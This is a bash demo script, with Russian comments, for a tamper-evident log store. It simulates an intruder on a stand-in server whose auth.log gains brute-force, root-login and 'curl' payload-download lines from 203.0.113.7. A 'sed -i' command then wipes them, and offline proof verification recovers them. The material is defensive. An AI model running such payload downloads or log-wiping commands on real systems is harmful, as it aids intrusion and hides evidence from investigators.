#!/usr/bin/env bash
# Демо «взломщик почистил журнал»: строки, которые сборщик уже прочитал,
# остаются в хранилище, хотя на сервере их больше нет.
#
#   1. хранилище «на своей машине» и сборщик «на веб-сервере»: сборщик следит
#      за учебным auth.log, как за /var/log/auth.log (на машине ничего не
#      трогается — всё в каталоге стенда);
#   2. обычные строки, затем вход взломщика: перебор пароля root, вход,
#      скачивание с его адреса;
#   3. взломщик вычищает свои строки (sed -i) — на сервере их не найти;
#   4. расследование: каждая строка источника — из хранилища, проверена
#      esverify офлайн, тело — байт в байт (-body); удалённые на сервере
#      строки видны, у каждой время приёма между метками TSA.
#
#   scripts/demo-intruder.sh
#   DEMO_TSA=digicert scripts/demo-intruder.sh   # метки у публичной TSA DigiCert (нужен интернет)
#   DEMO_TSA=nca scripts/demo-intruder.sh        # метки у TSA НУЦ РК (нужен интернет)
#   ES_BIN=/path/to/bin scripts/demo-intruder.sh # готовые бинарники вместо сборки
set -euo pipefail
cd "$(dirname "$0")/.."
WORK=${WORK:-$(mktemp -d)}
BIN=${ES_BIN:-$WORK/bin} # ES_BIN — готовые бинарники (например, из релиза) вместо сборки
PORT=${PORT:-18445}
mkdir -p "$BIN"

step() { printf '\n\033[1m== %s\033[0m\n' "$*"; }

step "build"
if [ -n "${ES_BIN:-}" ]; then "$BIN/evidencestore" version; else go build -o "$BIN/" ./cmd/...; fi

step "the store on its own host, a collector on the web server web-1"
"$BIN/evidencestore" dev-pki -out "$WORK/pki" -source web-1 >/dev/null

TSA_JSON='"url": "local", "every": "1h"'
TSA_TRUST=
case "${DEMO_TSA:-}" in
nca)
  NCA=$(pwd)/configs/tsa/nca-kz
  TSA_JSON="\"url\": \"http://tsp.pki.gov.kz\", \"every\": \"1h\", \"trust\": [\"$NCA/root_rsa_2020.cer\", \"$NCA/nca_rsa_2022.cer\"]"
  TSA_TRUST="$NCA/root_rsa_2020.cer,$NCA/nca_rsa_2022.cer"
  ;;
digicert)
  DC=$(pwd)/configs/tsa/digicert
  TSA_JSON="\"url\": \"http://timestamp.digicert.com\", \"every\": \"1h\", \"trust\": [\"$DC/DigiCertTrustedRootG4.crt\", \"$DC/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt\"]"
  TSA_TRUST="$DC/DigiCertTrustedRootG4.crt,$DC/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt"
  ;;
esac

cat >"$WORK/evidencestore.json" <<EOF
{
  "data_dir": "data",
  "roots_dir": "roots",
  "listen": "127.0.0.1:$PORT",
  "tls": {"cert": "pki/server.crt", "key": "pki/server.key", "client_ca": "pki/ca.crt"},
  "chain": {"tick": "200ms", "promise_mmd": "1m"},
  "tsa": {$TSA_JSON},
  "demo": true,
  "keys": {"min_wait": "1s", "backup_dir": "keyring-backup", "roots_mirror_dir": "roots-mirror"},
  "sources": [
    {"name": "web-1", "content_type": "syslog", "retention_months": 36}
  ]
}
EOF
CFG=$WORK/evidencestore.json
mkdir -p "$WORK/keyring-backup" "$WORK/roots-mirror" # в работе — другие диски; init их не создаёт
STORE_KEY=$("$BIN/evidencestore" init -config "$CFG" | tail -1)
"$BIN/evidencestore" serve -config "$CFG" 2>"$WORK/server.log" &
SERVER=$!
COLLECTOR=
trap 'kill $SERVER ${COLLECTOR:+$COLLECTOR} 2>/dev/null || true' EXIT
for _ in $(seq 50); do [ -S "$WORK/data/admin.sock" ] && break; sleep 0.1; done
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # T1: метка до первой строки
if [ -z "$TSA_TRUST" ]; then
  "$BIN/evidencestore" tsa-root -config "$CFG" -out "$WORK/tsa-root.crt" >/dev/null 2>&1
  TSA_TRUST=$WORK/tsa-root.crt
fi

# Сервер web-1 — каталог стенда; сборщик работает всё время, как служба.
LOG=$WORK/web-1/var/log/auth.log
mkdir -p "$(dirname "$LOG")"
: >"$LOG"
cat >"$WORK/collector.json" <<EOF
{
  "server": "https://127.0.0.1:$PORT",
  "ca": "pki/ca.crt", "cert": "pki/web-1.crt", "key": "pki/web-1.key",
  "store_key": "$STORE_KEY",
  "spool_dir": "spool", "file": "web-1/var/log/auth.log", "from_start": true, "flush_every": "200ms"
}
EOF
"$BIN/escollect" -config "$WORK/collector.json" 2>"$WORK/collector.log" &
COLLECTOR=$!
echo "store: 127.0.0.1:$PORT; collector: following web-1:/var/log/auth.log"

# max_seq — последний номер источника, принятый хранилищем.
max_seq() {
  "$BIN/evidencestore" status -config "$CFG" |
    python3 -I -c 'import json,sys; print(next((s["max_seq"] for s in json.load(sys.stdin)["sources"] if s["name"]=="web-1"), 0))'
}
wait_seq() {
  for _ in $(seq 150); do [ "$(max_seq)" -ge "$1" ] && return 0; sleep 0.2; done
  echo "ERROR: the store did not get record $1 from web-1"
  exit 1
}
# Строка syslog со временем UTC: тем же, в котором хранилище показывает приём.
log() { printf '%s web-1 %s\n' "$(LC_ALL=C date -u '+%b %e %H:%M:%S')" "$*" >>"$LOG"; }

# Начало окна для пакета по источнику в конце: больше чем через секунду
# после метки T1 — тогда нижняя метка окна она (DECISIONS, п. 27, 28). Время приёма
# идёт по якорю TSA (время в метке — до секунды) и может отставать от часов
# хоста до секунды: первая строка — заметно позже начала окна.
sleep 1.2
FROM=$(date -u +%FT%T.%NZ)
sleep 1.5

step "an ordinary morning on web-1 (times in UTC)"
log "sshd[1021]: Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2: ED25519 SHA256:k3Vq1rQ8"
log "sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app"
wait_seq 2
cat "$LOG"
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # метка: утро уже в цепи

step "an intruder gets in (these are only lines of text)"
sleep 1
log "sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2"
sleep 1
log "sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2"
sleep 1
log "sshd[1188]: Accepted password for root from 203.0.113.7 port 40112 ssh2"
sleep 1
log "sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.x http://203.0.113.7/x"
wait_seq 6
cat "$LOG"
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # метка: вторжение в цепи — до зачистки

step "the intruder cleans up: sed -i '/203.0.113.7/d' /var/log/auth.log"
sed -i '/203\.0\.113\.7/d' "$LOG"
echo "grep 203.0.113.7 /var/log/auth.log on web-1: $(grep -c '203\.0\.113\.7' "$LOG" || true) lines"
cat "$LOG"
# sed -i пишет новый файл: сборщик читает и его — две строки придут ещё раз.
wait_seq 8

step "investigation: every line web-1 sent, out of the store, each verified offline"
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # T2: метка над головой после всех строк
N=$(max_seq)
B=$WORK/bundles
mkdir -p "$B"
for n in $(seq 1 "$N"); do
  # Номер без записи — пропуск (его событие в цепи); пакета по нему нет.
  if "$BIN/evidencestore" proof -config "$CFG" -source web-1 -seq "$n" -dek -out "$B/$n.json" 2>/dev/null; then
    "$BIN/esverify" -proof "$B/$n.json" -store-key "$STORE_KEY" -tsa-trust "$TSA_TRUST" -json -body "$B/$n.body" >"$B/$n.report.json" 2>/dev/null || true
  fi
done
python3 -I - "$B" "$N" "$LOG" <<'PY'
import json, os, re, sys
from datetime import datetime, timezone
d, n, log = sys.argv[1], int(sys.argv[2]), sys.argv[3]
now = open(log, "rb").read().splitlines()

def hm(ts):  # время Go: до наносекунд, Python берёт микросекунды
    ts = re.sub(r"(\.\d{6})\d+", r"\1", ts).replace("Z", "+00:00")
    return datetime.fromisoformat(ts).astimezone(timezone.utc).strftime("%H:%M:%S UTC")

seen, deleted, again, bad = [], [], [], 0
when = lambda ts: datetime.fromisoformat(re.sub(r"(\.\d{6})\d+", r"\1", ts).replace("Z", "+00:00"))

def window(r):  # метки TSA — с точностью до секунды
    lo, hi = hm(r["lower"]), hm(r["upper"])
    return f"between {lo} and {hi} (TSA time-stamps)" if lo != hi else f"at {lo} (TSA time-stamps, to the second)"
print(" seq  proof         on web-1 now   line")
for i in range(1, n + 1):
    if not os.path.exists(f"{d}/{i}.report.json"):
        print(f"{i:>4}  —             —              (no record under this number: a gap, recorded in the chain)")
        continue
    r = json.load(open(f"{d}/{i}.report.json"))
    body = open(f"{d}/{i}.body", "rb").read() if r["valid"] else b""
    if not r["valid"]:
        bad += 1
        state = "?"
    elif body in seen:
        state = "yes (again)"
        again.append((i, r))
    elif body in now:
        state = "yes"
    else:
        state = "DELETED"
        deleted.append((i, r))
    seen.append(body)
    print(f"{i:>4}  {'VERIFIED' if r['valid'] else 'NOT VERIFIED':<12}  {state:<13}  {body.decode(errors='replace')}")
print()
for i, r in deleted:
    print(f"record {i}: deleted on web-1; the store received it {window(r)}")
if again:
    (i0, r0), i1 = again[0], again[-1][0]
    print(f"records {i0}-{i1}: sed -i wrote a new auth.log, and the collector read it too: the store got these lines"
          f" again {window(r0)}, which is when the file was rewritten")
    if deleted and when(r0["lower"]) >= max(when(r["upper"]) for _, r in deleted):
        print("the deleted lines were in the store before the file was rewritten: the time-stamp that covers them"
              " lies in the chain before the rewritten file's lines")
    else:
        sys.exit("ERROR: the time-stamps do not order the deleted lines before the rewrite")
if bad or len(deleted) != 4:
    sys.exit(f"ERROR: expected 4 deleted lines and every bundle verified; deleted {len(deleted)}, not verified {bad}")
PY

step "one deleted line in full: esverify, offline, with the store's pinned key"
"$BIN/esverify" -proof "$B/5.json" -store-key "$STORE_KEY" -tsa-trust "$TSA_TRUST" -body "$B/5.restored"
echo "restored line: $(cat "$B/5.restored")"

step "the auditor asks for the whole session of web-1 in one bundle: nothing in it can be left out"
TO=$(date -u +%FT%T.%NZ)
echo "window (receive time): $FROM – $TO"
echo "(a window is closed by a time-stamp taken more than two minutes after its end, and the bundle ends at the source"
echo " tails of the time-stamp after that one: two minutes pass, web-1 lives on)"
sleep 135 # две минуты и запас на часы хоста, спешащие перед TSA (DEMO_TSA=digicert)
log "sshd[1302]: Accepted publickey for deploy from 10.0.0.5 port 51260 ssh2: ED25519 SHA256:k3Vq1rQ8"
wait_seq 9
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # метка больше чем через две минуты после окна — закрывающая
log "sshd[1302]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"
wait_seq 10
"$BIN/evidencestore" stamp -config "$CFG" >/dev/null # её хвосты — верхний край пакета по источнику
"$BIN/evidencestore" proof -config "$CFG" -from "$FROM" -to "$TO" -source web-1 -dek -out "$WORK/session.json"
"$BIN/esverify" -proof "$WORK/session.json" -store-key "$STORE_KEY" -tsa-trust "$TSA_TRUST" -bodies "$WORK/session"
python3 -I - "$WORK/session" "$LOG" <<'PY'
import os, sys
d, log = sys.argv[1], sys.argv[2]
now = set(open(log, "rb").read().splitlines())
bodies = [open(os.path.join(d, f), "rb").read() for f in sorted(os.listdir(d), key=lambda f: int(f.rsplit("-", 1)[1]))]
deleted = list(dict.fromkeys(b.rstrip(b"\n") for b in bodies if b.rstrip(b"\n") not in now))
for line in deleted:
    print("in the window, gone from web-1:", line.decode(errors="replace"))
if len(deleted) != 4:
    sys.exit(f"ERROR: expected the 4 deleted lines in the window, found {len(deleted)}")
print(f"every line the store received from web-1 between the two time-stamps is in this one bundle ({len(bodies)} records),"
      " and none of them can be left out: the four deleted lines are among them")
PY

step "what this does not cover"
echo "- lines the intruder destroys before the collector reads them (within flush_every, here 200 ms) are not in the store;"
echo "- an intruder who stops the collector first shows as a lost collector after expect_contact (2 minutes; in the chain"
echo "  and as evidencestore_source_contact_lost); a shorter stop goes unseen, and root here can fake the heartbeat;"
echo "- the store keeps what the server wrote; it does not make a line true, it makes it impossible to remove unnoticed;"
echo "- the store runs on another host: editing its files is caught too (scripts/demo.sh shows a one-byte forgery)."
echo
echo "work directory: $WORK"
